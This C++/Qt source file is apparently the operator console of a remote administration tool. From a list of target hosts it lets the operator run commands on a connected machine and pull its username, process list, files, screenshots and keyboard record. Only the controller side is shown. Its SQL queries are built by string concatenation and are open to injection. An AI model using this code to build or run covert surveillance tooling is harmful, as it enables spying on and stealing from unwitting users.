/*
author: Forec
last edit date: 2016/09/16
email: forec@bupt.edu.cn
LICENSE
Copyright (c) 2015-2017, Forec <forec@bupt.edu.cn>

Permission to use, copy, modify, and/or distribute this code for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

#include "mainwindow.h"
#include <string.h>
#include <QScrollArea>
#include <QScrollBar>


#pragma execution_character_set("utf-8")

size_t readFileIntoBuf(FILE **fp, char *bbuf, unsigned int buflen){	// server
    memset(bbuf, 0, buflen);
    size_t readLen = 0, index = 0;
    while ((readLen = fread(bbuf + index, sizeof(char), buflen - 4 - index, *fp)) != 0){
        index += readLen;
        if (index == buflen - 4){
            break;
        }
    }
    return index;
}

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    // set tableWidget
    ui->setupUi(this);
    ui->tableWidget->setContextMenuPolicy(Qt::CustomContextMenu);
    ui->tableWidget->setSelectionBehavior(QAbstractItemView::SelectRows);   // 选定一行
    ui->tableWidget->setEditTriggers(QAbstractItemView::NoEditTriggers);    // 禁止编辑
    ui->tableWidget->setHorizontalHeaderLabels(QStringList()<<"Statu"<<"Host Name"<<"IPv4 Address"<<"notes");

    // set tableWidget Menu
    popMenu = new QMenu(ui->tableWidget);
    ui->tableWidget->setColumnCount(4);

    // set actions
    connect_action = new QAction("Connect",this);
    disconnect_action = new QAction("Disconnect",this);
    setip_action = new QAction("Set IPv4 Address", this);
    addmem_action = new QAction("Modify Notes",this);
    //getcmd_action = new QAction("发送cmd指令", this);
    getfile_action = new QAction("Get File", this);
    getusername_action = new QAction(QObject::tr("Get Username"), this);
    getkeyboard_action = new QAction("Get Keyboard Record",this);
    getpslist_action = new QAction("Get Processes List", this);
    getscreenshot_action = new QAction("Get ScreenShot", this);
    viewhistory_action = new QAction("Export Logs", this);
    delete_action = new QAction("Delete", this);

    // connect signals
    connect(connect_action, SIGNAL(triggered(bool)), this, SLOT(connectL()));
    connect(disconnect_action, SIGNAL(triggered(bool)), this, SLOT(disconnectL()));
    connect(setip_action, SIGNAL(triggered(bool)), this, SLOT(setIP()));
    connect(addmem_action, SIGNAL(triggered(bool)), this, SLOT(addmem()));
    //connect(getcmd_action, SIGNAL(triggered(bool)), this, SLOT(getcmd()));
    connect(getusername_action, SIGNAL(triggered(bool)), this, SLOT(getusername()));
    connect(getpslist_action, SIGNAL(triggered(bool)), this, SLOT(getpslist()));
    connect(getscreenshot_action, SIGNAL(triggered(bool)), this, SLOT(getscreenshot()));
    connect(getkeyboard_action, SIGNAL(triggered(bool)), this, SLOT(getkeyboard()));
    connect(viewhistory_action, SIGNAL(triggered(bool)), this, SLOT(viewhistory()));
    connect(getfile_action, SIGNAL(triggered(bool)), this, SLOT(getfile()));
    connect(delete_action, SIGNAL(triggered(bool)), this, SLOT(deleteL()));

    // connect sql
    isInitial = true;
    db = QSqlDatabase::addDatabase("QSQLITE");
    db.setDatabaseName("data.db");
    if (!QFile::exists("data.db")){
        alert_error("Database not exists! Build a new database named data.db.");
        QFile file("data.db");
        file.open(QIODevice::WriteOnly);
        file.close();
    }
    if (!db.open()){
        alert_error("Failed to connect database");
        exit(0);
    }
    // add widget items
    query = QSqlQuery(db);
    query.exec("create table hosts(statu INTEGER, name TEXT, ip TEXT, rem TEXT)");
    query.exec("create table logs(name TEXT, ip TEXT, log TEXT)");

    /* only for debug
    query.exec("insert into hosts values(0, 'Alice', '127.0.0.1')");
    query.exec("insert into hosts values(1, 'Forec', '12.0.4.1')");
    query.exec("insert into hosts values(1, 'Chang', '125.2.3.9')");
    */

    query.exec("select * from hosts");
    // int cols=ui->tableWidget->columnCount();
    while (query.next()){
        int rows=ui->tableWidget->rowCount();
        ui->tableWidget->insertRow(rows);
        ui->tableWidget->setItem(rows, 2, new QTableWidgetItem(""));
        ui->tableWidget->item(rows, 2)->setTextAlignment(Qt::AlignCenter);
        for(int i = 0; i < 4 ; i++){
            if (!i){
                bool statu = query.value(0).toInt();
                if (statu){
                    ui->tableWidget->setItem(rows, 0 , new QTableWidgetItem("Online"));
                }else{
                    ui->tableWidget->setItem(rows, 0 , new QTableWidgetItem("Offline"));
                }
            }else{
                ui->tableWidget->setItem(rows, i , new QTableWidgetItem(query.value(i).toString()));
            }
            ui->tableWidget->item(rows, i)->setTextAlignment(Qt::AlignCenter);
        }
    }

    // set up disable
    ui->textEdit->setReadOnly(true);
    ui->textEdit->setText("> ");

    // set up connectinos
    tempIP = "";
    cur_target.isconnected = false;
    cur_item = NULL;

    // end initial
    isInitial = false;
    system("mkdir files");
    system("mkdir logs");
    system("mkdir screenshots");
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::connectL(){
    int row = ui->tableWidget->currentRow();
    QString name = ui->tableWidget->item(row,1)->text();
    QString ip = ui->tableWidget->item(row,2)->text();
    if (cur_target.isconnected){
        disconnectL();
    }
    strcpy(cur_target.name, name.toStdString().c_str());
    strcpy(cur_target.ip, ip.toStdString().c_str());

    ui->label_3->setText("Connecting...");
    if (Tryconnect(sclient, cur_target)){
        cur_target.isconnected = true;
        ui->label_2->setText(cur_target.ip);
        ui->tableWidget->item(row, 0)->setText("Online");
        insert_log("Try connection, success");
        cur_item = ui->tableWidget->item(row, 0);
        getusername();
    } else {
        alert_error("Remote host refuse to connect");
        ui->label_2->setText("No connection");
        ui->tableWidget->item(row, 0)->setText("Offline");
        cur_target.isconnected= false;
        insert_log("Try connection, failed");
        cur_item = NULL;
    }
    ui->label_3->setText("");
}

void MainWindow::disconnectL(){
    ui->label_3->setText("Disconnecting...");
    insert_log("Client disconnect actively");
    cur_target.isconnected = false;
    cur_item = NULL;
    closesocket(sclient);
    ui->label_2->setText("No connection");
    ui->label_3->setText("");
}

void MainWindow::setIP(){
    tempIP = ui->tableWidget->item(ui->tableWidget->currentRow(), 2)->text();
    ui->tableWidget->editItem(ui->tableWidget->item(ui->tableWidget->currentRow(), 2));
}

void MainWindow::addmem(){
    ui->tableWidget->editItem(ui->tableWidget->item(ui->tableWidget->currentRow(), 3));
}

void MainWindow::getcmd(){
    QString command = ui->lineEdit->text();
    if (sendCMD(sclient, command, buf)){
        insert_log("Send command: "+command +"\n" + "Receive: \n");
        ui->textEdit->setPlainText(ui->textEdit->toPlainText() +
                       command.toStdString().c_str() + "\n");
        tempfp = fopen("temp.tmp", "rb");
        size_t readLen = 0;
        do{
            readLen = readFileIntoBuf(&tempfp, buf, BUFLEN);
            QString receive = QString::fromLocal8Bit(buf);
            QString utf8receive = GBK2UTF8(receive);
            insert_log(utf8receive);
            ui->textEdit->setPlainText(ui->textEdit->toPlainText() + utf8receive);
        }while (readLen > 0);
        ui->textEdit->setPlainText(ui->textEdit->toPlainText() + "\n> ");
    } else {
        insert_log("Send command: "+command +"\n" + "Failed executing\n");
        ui->textEdit->setPlainText(ui->textEdit->toPlainText() +
                       command.toStdString().c_str() + "\nFailed to execute.\n> ");
        if (!checkLive()){
            return;
        }
    }
    QTextEdit *edit = ui->textEdit;
    QScrollBar *sb = edit->verticalScrollBar();
    sb->setValue(sb->maximumHeight());    // 自动最底
    memset(buf, 0, BUFLEN);
}

void MainWindow::getfile(){
    QString path = ui->lineEdit->text();
    ui->label->setText("Disabled");
    if (!alert_check("Click OK to start receiving file, all components will be disabled in this period.")){
        ui->label->setText("Cur Connection");
        return;
    }
    // disable widgets
    ui->pushButton->setDisabled(true);
    ui->pushButton_2->setDisabled(true);
    ui->pushButton_4->setDisabled(true);
    ui->lineEdit->setDisabled(true);
    ui->tableWidget->setDisabled(true);

    ui->label_3->setText("Receiving...");
    if (getFile(sclient, path)){
        ui->label_3->setText("");
        ui->lineEdit->clear();
        insert_log("Receiving file "+path+" succeed.");

        char filename[257];
        strcpy(filename, path.toStdString().c_str());
        getFilename(filename);
        QString saveFileName = QString("files\\") + QString(filename);
        alert_info("File received, saved at "+saveFileName);

        // enable widgets
        ui->pushButton->setDisabled(false);
        ui->pushButton_2->setDisabled(false);
        ui->pushButton_4->setDisabled(false);
        ui->lineEdit->setDisabled(false);
        ui->tableWidget->setDisabled(false);
    }else{
        insert_log("Try receiving " +path+" failed.");
        // enable widgets
        ui->pushButton->setDisabled(false);
        ui->pushButton_2->setDisabled(false);
        ui->pushButton_4->setDisabled(false);
        ui->lineEdit->setDisabled(false);
        ui->tableWidget->setDisabled(false);
        disconnectL();
        Tryconnect(sclient, cur_target);
        if (!checkLive()){
            return;
        }
        alert_error("Failed to receive file.");
    }
    ui->label_3->setText("");
    ui->label->setText("Cur Connection");
}

void MainWindow::getkeyboard(){
    if (getKeyBoard(sclient, buf)){
        insert_log("Get Keyboard.");
        ui->textEdit->setPlainText(ui->textEdit->toPlainText() + "Key board record:\n");
        tempfp = fopen("temp.tmp", "rb");
        size_t readLen = 0;
        do{
            readLen = readFileIntoBuf(&tempfp, buf, BUFLEN);
            QString receive = QString::fromLocal8Bit(buf);
            QString utf8receive = GBK2UTF8(receive);
            insert_log(utf8receive);
            ui->textEdit->setPlainText(ui->textEdit->toPlainText() + utf8receive);
        }while (readLen > 0);
        ui->textEdit->setPlainText(ui->textEdit->toPlainText() + "\n> ");
    }else{
        insert_log("Try to get keyboard record, failed.\n");
        ui->textEdit->setPlainText(ui->textEdit->toPlainText() +
                        "\nFailed to get keyboard record.\n> ");
    }
    QTextEdit *edit = ui->textEdit;
    QScrollBar *sb = edit->verticalScrollBar();
    sb->setValue(sb->maximumHeight());    // 自动最底
    memset(buf, 0, BUFLEN);
    // bugs in server
    checkLive();
}

void MainWindow::getpslist(){
    if (getPSList(sclient, buf)){
        QString receive = QString::fromLocal8Bit(buf);
        QString utf8receive = GBK2UTF8(receive);
        insert_log("Get Processes List:\n"+utf8receive);
        ui->textEdit->setPlainText(ui->textEdit->toPlainText() +
                       "Get Processes List:\n" + utf8receive + "\n> ");
    }else{
        insert_log("Get Processes List, failed.\n");
        ui->textEdit->setPlainText(ui->textEdit->toPlainText() +
                        "\nFailed to get processes list.\n> ");
        if (!checkLive()){
            return;
        }
    }
    QTextEdit *edit = ui->textEdit;
    QScrollBar *sb = edit->verticalScrollBar();
    sb->setValue(sb->maximumHeight());    // 自动最底
    memset(buf, 0, BUFLEN);
}

void MainWindow::viewhistory(){
    QString name = ui->tableWidget->item(ui->tableWidget->currentRow(),1)->text();
    QString ip = ui->tableWidget->item(ui->tableWidget->currentRow(),2)->text();
    if ( name != "Unknown"){
        query.exec("select * from logs where name='" + name +"'");
    }else {
        query.exec("select * from logs where ip='"+ip+"'");
    }
    if (query.first()){
        FILE *fp;
        QString saveFileName;
        if (name == "Unknown"){
            saveFileName = "logs\\" +ip + ".log";
            fp = fopen(saveFileName.toStdString().c_str(), "w");
        }else{
            saveFileName = "logs\\" + name + ".log";
            fp = fopen(saveFileName.toStdString().c_str(), "w");
        }
        if (fp == NULL){
            alert_error("Failed to export logs.");
        }else{
            QString logs = query.value(2).toString();
            fprintf(fp, "%s", logs.toStdString().c_str());
            fclose(fp);
            alert_info("Export logs into " +saveFileName);
        }
    }else{
        alert_error("No related logs queried.");
    }
}

void MainWindow::getusername(){
    ui->label_3->setText("Get Username...");
    char name[BUFLEN];
    int row = ui->tableWidget->currentRow();
    if (getUserName(sclient, name)){
        ui->tableWidget->item(row, 1)->setText(QString(name));
        strcpy(cur_target.name, name);
        insert_log("Getting username, succeed. Username " + QString(name));
    }else{
        strcpy(cur_target.name, "Unknown");
        ui->tableWidget->item(row, 1)->setText(QString("Unknown"));
        insert_log("Try to get username, failed.");
        if (!checkLive()){
            return;
        }
        ui->label_3->setText("");
        alert_error("Cannot get remote host's username.");
    }
    ui->label_3->setText("");
}

void MainWindow::getscreenshot(){
    ui->label_3->setText("Receiving screenshot...");
    if (getScreenShot(sclient, cur_target)){
        ui->label_3->setText("");
    }else{
        if (!checkLive()){
            return;
        }
        alert_error("Failed to receive screenshot.");
    }
    ui->label_3->setText("");
}

void MainWindow::deleteL(){
    QString name = ui->tableWidget->item(ui->tableWidget->currentRow(), 1)->text();
    QString ip = ui->tableWidget->item(ui->tableWidget->currentRow(), 2)->text();
    if (name == "Unknown"){
        query.exec("delete from hosts where ip='" + ip +"'");
        query.exec("delete from logs where ip='" + ip +"'");
    }else{
        query.exec("delete from hosts where name='" + name +"'");
        query.exec("delete from logs where name='" + name +"'");
    }
    ui->tableWidget->removeRow(ui->tableWidget->currentRow());
}

void MainWindow::on_tableWidget_customContextMenuRequested(const QPoint &)
{
    // TODO: verify whether the host is connected.
    popMenu->clear();
    if (ui->tableWidget->currentItem() != NULL){
        if (ui->tableWidget->item(ui->tableWidget->currentRow(), 2)->text() == cur_target.ip &&
                cur_target.isconnected){
            popMenu->addAction(disconnect_action);
            popMenu->addAction(setip_action);
            popMenu->addAction(addmem_action);
            popMenu->addAction(getusername_action);
    //        popMenu->addAction(getcmd_action);
            popMenu->addAction(getfile_action);
            popMenu->addAction(getpslist_action);
            popMenu->addAction(getscreenshot_action);
            popMenu->addAction(getkeyboard_action);
            popMenu->addAction(viewhistory_action);
            popMenu->addAction(delete_action);
            popMenu->exec(QCursor::pos());
        }else if (ui->tableWidget->item(ui->tableWidget->currentRow(), 2)->text() == ""){
            popMenu->addAction(setip_action);
            popMenu->addAction(addmem_action);
            popMenu->addAction(viewhistory_action);
            popMenu->addAction(delete_action);
            popMenu->exec(QCursor::pos());
        }else{
            popMenu->addAction(connect_action);
            popMenu->addAction(setip_action);
            popMenu->addAction(addmem_action);
            popMenu->addAction(viewhistory_action);
            popMenu->addAction(delete_action);
            popMenu->exec(QCursor::pos());
        }
    }
}

void MainWindow::on_pushButton_2_clicked()
{
    int rows = ui->tableWidget->rowCount();
    ui->tableWidget->insertRow(rows);
    ui->tableWidget->setItem(rows, 2 , new QTableWidgetItem(""));
    ui->tableWidget->setItem(rows, 0 , new QTableWidgetItem("Offline"));
    ui->tableWidget->setItem(rows, 1 , new QTableWidgetItem("Unknown"));
    ui->tableWidget->setItem(rows, 3 , new QTableWidgetItem(""));
    for (int i = 0; i < 4; i++){
        ui->tableWidget->item(rows, i)->setTextAlignment(Qt::AlignCenter);
    }
    ui->tableWidget->scrollToBottom();// 自动最底
    ui->tableWidget->editItem(ui->tableWidget->item(rows, 2));
}


void alert_error(const QString & err){
    QMessageBox::information(0, QObject::tr("Error"),
                             QObject::tr(err.toStdString().c_str()));
}

void alert_info(const QString & info){
    QMessageBox::information(0, QObject::tr("Info"),
                             QObject::tr(info.toStdString().c_str()));
}

bool alert_check(const QString & check){
    QMessageBox mess(QMessageBox::Question, "Confirm your choice", check, NULL);
    QPushButton *okButton = mess.addButton("OK", QMessageBox::AcceptRole);
    mess.addButton("CANCEL",QMessageBox::RejectRole);
    mess.exec();
    if ((QPushButton*)mess.clickedButton() == okButton){
        return true;
    }else{
        return false;
    }
}

void MainWindow::on_tableWidget_itemChanged(QTableWidgetItem *item)
{
    if (isInitial)
        return;
    if ( (item != NULL) && item->column() == 2 &&
         ui->tableWidget->item(item->row(), 2)->text() != ""){
        QString IPv4pattern("\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b");
        QRegExp IPv4rx(IPv4pattern);
        if ( !IPv4rx.exactMatch(ui->tableWidget->item(item->row(), 2)->text()) ){
            alert_error("Invalid IPv4 Address!");
            ui->tableWidget->item(item->row(), 2)->setText(tempIP);
        }
        QString name = ui->tableWidget->item(item->row(), 1)->text();
        QString ip = ui->tableWidget->item(item->row(), 2)->text();
        QString rem = ui->tableWidget->item(item->row(), 3)->text();
        query.exec("select * from hosts where name='"+name+"'");
        if (query.first() && query.value(1).toString() != "Unknown"){
            query.exec("update hosts set ip='"+ip+"' where name='"+name+"'");
        }
        else{
            QString statu = ui->tableWidget->item(item->row(), 0)->text();
            if (statu == "Online"){
                statu = "1";
            }else{
                statu = "0";
            }
            query.exec("insert into hosts values(" + statu + ", " +
                       "'" + name + "', '" + ip +"', '" +rem+"')");
        }
    } else if ((item != NULL)){
        QString ip = ui->tableWidget->item(item->row(), 2)->text();
        if (item->column() == 0){
            QString statu = item->text();
            if (statu == "Online"){
                statu = "1";
            }else{
                statu = "0";
            }
            query.exec("update hosts set statu="+statu+" where ip='"+ip+"'");
        }else if (item->column() == 1){
            query.exec("update hosts set name='"+item->text()+"' where ip='"+ip+"'");
        }else if (item->column() == 3){
            query.exec("update hosts set rem='"+item->text()+"' where ip='"+ip+"'");
        }
    }
    tempIP = "";
}

void MainWindow::insert_log(const QString &log){
    QDateTime ctime = QDateTime::currentDateTime();
    QString timestr = ctime.toString("yyyy-MM-dd hh:mm:ss ddd");
    QString newlog = QString("\n\nRemote host's name:")+ QString(cur_target.name) +
                    QString("  current IPv4 Address:") +
                    QString(cur_target.ip) + QString("  time:") + timestr +QString("\n") +log;
    if (QString(cur_target.name) == "Unknown"){
        query.exec("select * from logs where ip='"+QString(cur_target.ip)+"'");
    } else {
        query.exec("select * from logs where name='"+QString(cur_target.name)+"'");
    }
    if (!query.first()){
        query.exec("insert into logs values('"+QString(cur_target.name)+"', '" +
                   QString(cur_target.ip) +"', '')");
    }
    if (QString(cur_target.name)=="Unknown"){
        query.exec("select * from logs where ip='"+QString(cur_target.ip)+"'");
        query.first();
        QString base_log = query.value(2).toString();
        query.exec("update logs set log='" + base_log +
                   newlog + "' where ip='" + QString(cur_target.ip) +"'");
    }else {
        query.exec("select * from logs where name='"+QString(cur_target.name)+"'");
        query.first();
        QString base_log = query.value(2).toString();
        query.exec("update logs set log='" + base_log +
                   newlog + "' where name='" + QString(cur_target.name) +"'");
    }
}

bool MainWindow::checkLive(){
    if (cur_target.isconnected && cur_item != NULL){
        if (!checkL(sclient)){
            cur_item->setText("Offline");
            cur_target.isconnected = false;
            closesocket(sclient);
            ui->label_2->setText("No connection");
            ui->label_3->setText("");
            insert_log("Loss connection with remote host.");
            alert_error("Loss connection with remote host.");
            return false;
        }else
            return true;
    }
    return false;
}

void MainWindow::on_lineEdit_returnPressed(){
    getcmd();
    ui->lineEdit->clear();
}

void MainWindow::on_pushButton_4_pressed(){
    getcmd();
    ui->lineEdit->clear();
}

void MainWindow::on_pushButton_clicked()
{
    ui->label->setText("Disabled");
    ui->label_3->setText("refresh hosts list..");
    ui->label_2->setText("scanning online hosts");
    if (!alert_check("Click OK to start scanning, all components will be disabled in the period."))
        return;
    // disable widgets
    ui->pushButton->setDisabled(true);
    ui->pushButton_2->setDisabled(true);
    ui->pushButton_4->setDisabled(true);
    ui->lineEdit->setDisabled(true);
    ui->tableWidget->setDisabled(true);

    cur_target.isconnected = false;

    HANDLE handles[201];
    param actives[1001];
    int useful = 0;

    for (int i = 0; i < ui->tableWidget->rowCount(); i++){
        if (ui->tableWidget->item(i,2) == NULL ||
            ui->tableWidget->item(i,2)->text() == ""){
            actives[i].active = false;
            continue;
        }
        actives[i].name = ui->tableWidget->item(i,1)->text();
        actives[i].ip = ui->tableWidget->item(i,2)->text();
        actives[i].active = false;
        handles[useful++] = (HANDLE)_beginthreadex(NULL, 0,
               refreshThread, (void *)(&actives[i]), 0,NULL );
        if (handles[useful-1] == 0)
            useful--;
    }
    // wait for scan complete
    WaitForMultipleObjects(useful, handles, TRUE, INFINITE);
    for (int i = 0 ; i < useful; i++){
        CloseHandle(handles[i]);
    }

    // update ui
    for (int i = 0; i < ui->tableWidget->rowCount();i++){
        if (actives[i].active){
            ui->tableWidget->item(i, 0)->setText("Online");
            if (ui->tableWidget->item(i, 1)->text() != actives[i].name)
                ui->tableWidget->item(i,1)->setText(actives[i].name);
        }else{
            ui->tableWidget->item(i,0)->setText("Offline");
        }
    }

    // enable widgets
    ui->pushButton->setDisabled(false);
    ui->pushButton_2->setDisabled(false);
    ui->pushButton_4->setDisabled(false);
    ui->lineEdit->setDisabled(false);
    ui->tableWidget->setDisabled(false);
    // display
    ui->label->setText("Cur Connection");
    ui->label_3->setText("");
    ui->label_2->setText("No connection");
    alert_info("Scanning finished.");
}

unsigned int __stdcall refreshThread(void* pM){
    param *ac = (param*)pM;
    char username[BUFLEN];
    SOCKET tempclient;
    target cur_target;
    cur_target.isconnected = false;

    strcpy(cur_target.name, ac->name.toStdString().c_str());
    strcpy(cur_target.ip, ac->ip.toStdString().c_str());
    if (Tryconnect(tempclient, cur_target)){
        ac->active = true;
    }
    if (getUserName(tempclient, username)){
        ac->name=QString(username);
    }
    closesocket(tempclient);
    return 0;
}
